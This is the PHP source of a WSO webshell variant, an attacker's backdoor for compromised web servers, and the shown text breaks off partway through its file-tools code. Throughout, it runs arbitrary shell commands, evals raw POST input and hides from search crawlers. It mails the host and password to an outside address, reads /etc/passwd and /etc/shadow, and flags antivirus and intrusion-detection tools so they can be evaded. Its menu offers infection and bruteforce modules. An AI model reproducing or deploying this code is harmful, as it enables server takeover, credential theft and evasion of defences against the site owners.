<?php
//--------------Watching webshell!--------------
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('shadowhacker-287@mail.ru', 'root', $tmp); // Edit or delete!
}
//-----------------Password---------------------
$▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
$▙ = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
}
if(empty($_POST['charset']))
	$_POST['charset'] = $▜;
if (!isset($_POST['ne'])) {
	if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
}
function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')){
    set_magic_quotes_runtime(0);
}
@define('VERSION', '4.2.5');
if(get_magic_quotes_gpc()) {
	function stripslashes_array($array) {
		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
	}
	$_POST = stripslashes_array($_POST);
    $_COOKIE = stripslashes_array($_COOKIE);
}
/* (С) 11.2011 oRb */
if(!empty($▛)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
        prototype(md5($_SERVER['HTTP_HOST']), $▛);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
function hardLogin() {
		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		  header('HTTP/1.0 404 Not Found');
		  exit;
		  }
		}
	die("</br></br><pre align=center><form method=post style='font-family:fantasy;color:#ff0048;text-align: center;'>Hello <br>Welcome to wso webshell redesignated by Ghostboy-287<br><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#1e252e;color:#fff;cursor:pointer;'></form></pre>


<div class='view'><div class='plane main'><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div></div></div>


<style>body,html{background:#222;overflow:hidden;width:100%;height:100%;position:absolute;z-index: -2;}.view{position:absolute;top:0;left:0;right:0;bottom:0;-webkit-perspective:400;perspective:400;z-index: -2;}.plane{width:120px;height:120px;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;position:absolute;z-index: -2;}.plane.main{position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;-webkit-transform:rotateX(60deg) rotateZ(-30deg);transform:rotateX(60deg) rotateZ(-30deg);-webkit-animation:rotate 20s infinite linear;animation:rotate 20s infinite linear;z-index: -2;}.plane.main .circle{width:120px;height:120px;position:absolute;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;border-radius:100%;box-sizing:border-box;box-shadow:0 0 60px #dc143c,inset 0 0 60px #dc143c;z-index: -2;}.plane.main .circle::after,.plane.main .circle::before{content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:10%;height:10%;border-radius:100%;background:#dc143c;box-sizing:border-box;box-shadow:0 0 60px 2px #dc143c;z-index: -2;}.plane.main .circle::before{-webkit-transform:translateZ(-90px);transform:translateZ(-90px)}.plane.main .circle::after{-webkit-transform:translateZ(90px);transform:translateZ(90px)}.plane.main .circle:nth-child(1){-webkit-transform:rotateZ(72deg) rotateX(63.435deg);transform:rotateZ(72deg) rotateX(63.435deg)}.plane.main .circle:nth-child(2){-webkit-transform:rotateZ(144deg) rotateX(63.435deg);transform:rotateZ(144deg) rotateX(63.435deg)}.plane.main .circle:nth-child(3){-webkit-transform:rotateZ(216deg) rotateX(63.435deg);transform:rotateZ(216deg) rotateX(63.435deg)}.plane.main .circle:nth-child(4){-webkit-transform:rotateZ(288deg) rotateX(63.435deg);transform:rotateZ(288deg) rotateX(63.435deg)}.plane.main .circle:nth-child(5){-webkit-transform:rotateZ(360deg) rotateX(63.435deg);transform:rotateZ(360deg) rotateX(63.435deg)}@-webkit-keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}@keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}; h2{color:whitesmoke; font-weight:bold; text-decoration:underline;}</style><footer id='det' style='position:fixed; left:0px; right:0px; bottom:0px; background:rgb(0,0,0); text-align:center; border-top: 1px solid #ff007e; border-bottom: 1px solid #ff007e'><font face='Century Gothic' color='#ff0048' size='5'><font style='font-size: 10pt' face='Century Gothic'><font face='Tahoma' color='#005aff' size='2.5'><font color='#ff007e'><b> ©opy®ight : </b></font>
	<marquee scrollamount='3' scrolldelay='60' width='80%'><b> Twepl & <a href='https://github.com/Ghostboy-287'>Ghostboy Twoeightseven</a> </b></marquee>  </font></font></font></footer>");
}
if(strtolower(substr(PHP_OS,0,3)) == "win")
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';
/* (С) 04.2015 Pirat */
function hardHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['▜'];
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
<style>
	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
	table.info	{color:#C3C3C3;}
	table#toolsTbl {background-color: #060A10;}
	span,h1,a	{color:#00ff12 !important;}
	span		{font-weight:bolder;}
	h1			{border-left:5px solid #ff0000;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
	a			{text-decoration:none;}
	a:hover		{text-decoration:underline;}
	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
	.tooltip:hover::after {opacity:1;visibility:visible;}
	.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
	.bigarea	{min-width:100%;max-width:100%;height:400px;}
	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
	label {position:relative}
	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
	form		{margin:0px;}
	#toolsTbl	{text-align:center;}
	#fak 		{background:none;}
	#fak td 	{padding:5px 0 0 0;}
	iframe		{border:1px solid #060a10;}
	.toolsInp	{width:300px}
	.main th	{text-align:left;background-color:#060a10;}
	.main tr:hover{background-color:#354252;}
	.main td, th{vertical-align:middle;}
	input[type='submit']{background-color:#ff0000;}
	input[type='button']{background-color:#ff0000;}
	input[type='submit']:hover{background-color:#56AD15;}
	input[type='button']:hover{background-color:#56AD15;}
	.l1			{background-color:#202832;}
	pre			{font:9pt Courier New;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;

	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		d.mf.a.value = encrypt(d.mf.a.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.c.value = encrypt(d.mf.c.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'https://anon.click/protected/https://www.exploit-db.com/search/?action=search&description=';
	if(strpos('Linux', $kernel) !== false)
		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$explink .= urlencode($kernel . ' ' . substr($release,0,3));
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $▟)
		$opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
	if(!empty($GLOBALS['▛']))
	$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
	$drives = "";
	if ($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if (is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	/* (С) 08.2015 dmkcv */
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="https://anon.click/protected/https://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
		 '<table style="background-color:#009cff;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
}
function hardFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FFDB5F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	<tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='submit'></form></td>
		<td><form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
		<td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
		<td><form method='post' ".( (!function_exists('actionFilesMan'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=ne value=''>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
	</tr></table></div>
	<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
	</body></html>";
}
if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
function ex($in) {
	$▖ = '';
	if (function_exists('exec')) {
		@exec($in,$▖);
		$▖ = @join("\n",$▖);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$▖ = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$▖ = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$▖ = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$▖ = "";
		while(!@feof($f))
			$▖ .= fread($f,1024);
		pclose($f);
	}else return "↳ Unable to execute command\n";
	return ($▖==''?"↳ Query did not return anything\n":$▖);
}
function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}
function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function viewPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#FFDB5F><b>'.perms(@fileperms($f)).'</b></font>';
}
function hardScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}
function which($p) {
	$path = ex('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"VERSION" => VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}
function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function actionSecInfo() {
	hardHeader();
	echo '<h1>Server security information</h1><div class=content>';
	function showSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>' . $n . ': </span>';
			if(strpos($v, "\n") === false)
				echo $v . '<br>';
			else
				echo '<pre class=ml1>' . $v . '</pre>';
		}
	}
	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	showSecParam('Open base dir', @ini_get('open_basedir'));
	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	showSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	if($GLOBALS['os'] == 'nix') {
            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            showSecParam('OS version', @file_get_contents('/proc/version'));
            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                showSecParam('HDD space', ex('df -h'));
                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
				showSecParam('Mount options', @file_get_contents('/etc/fstab'));
            }
	} else {
		showSecParam('OS Version',ex('ver'));
		showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts')));
		showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user')));
	}
	echo '</div>';
	hardFooter();
}
function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	hardHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		hardFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');
	else
